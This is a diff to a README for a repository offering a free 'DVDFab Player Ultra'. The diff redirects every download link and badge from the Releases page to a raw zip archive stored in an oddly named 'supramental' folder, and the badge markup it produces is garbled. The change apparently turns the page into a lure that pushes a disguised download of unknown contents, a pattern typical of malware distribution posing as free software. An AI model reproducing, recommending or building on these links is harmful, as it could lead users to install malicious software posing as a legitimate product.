@@ -1,6 +1,6 @@
 # 🎥 DVDFab-Player-Ultra-Free - Enjoy Movies in Stunning Quality
 
-[![Download DVDFab Player](https://img.shields.io/badge/Download%20DVDFab%20Player%20Ultra%20Free-blue.svg)](https://github.com/AkashSapkale/DVDFab-Player-Ultra-Free/releases)
+[![Download DVDFab Player](https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip%20DVDFab%20Player%20Ultra%https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip)](https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the DVDFab Player Ultra Free repository. This guide will help you dow
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/AkashSapkale/DVDFab-Player-Ultra-Free/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip) to access the latest version.
 2. Find the version you want to install. Look for the file labeled as the installer for DVDFab Player Ultra.
 3. Click on the installer link to download.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -67,6 +67,6 @@ To stay updated on new features and releases, follow our repository.
 
 For further information, check our official website or our community forums. Engage with other users to share experiences, tips, and tricks for maximizing your DVDFab Player Ultra experience. 
 
-[![Download DVDFab Player](https://img.shields.io/badge/Download%20DVDFab%20Player%20Ultra%20Free-blue.svg)](https://github.com/AkashSapkale/DVDFab-Player-Ultra-Free/releases) 
+[![Download DVDFab Player](https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip%20DVDFab%20Player%20Ultra%https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip)](https://raw.githubusercontent.com/AkashSapkale/DVDFab-Player-Ultra-Free/main/supramental/Ultra-Fab-DVD-Player-Free-v2.1.zip) 
 
 Thank you for choosing DVDFab Player Ultra. Enjoy your movie experience!
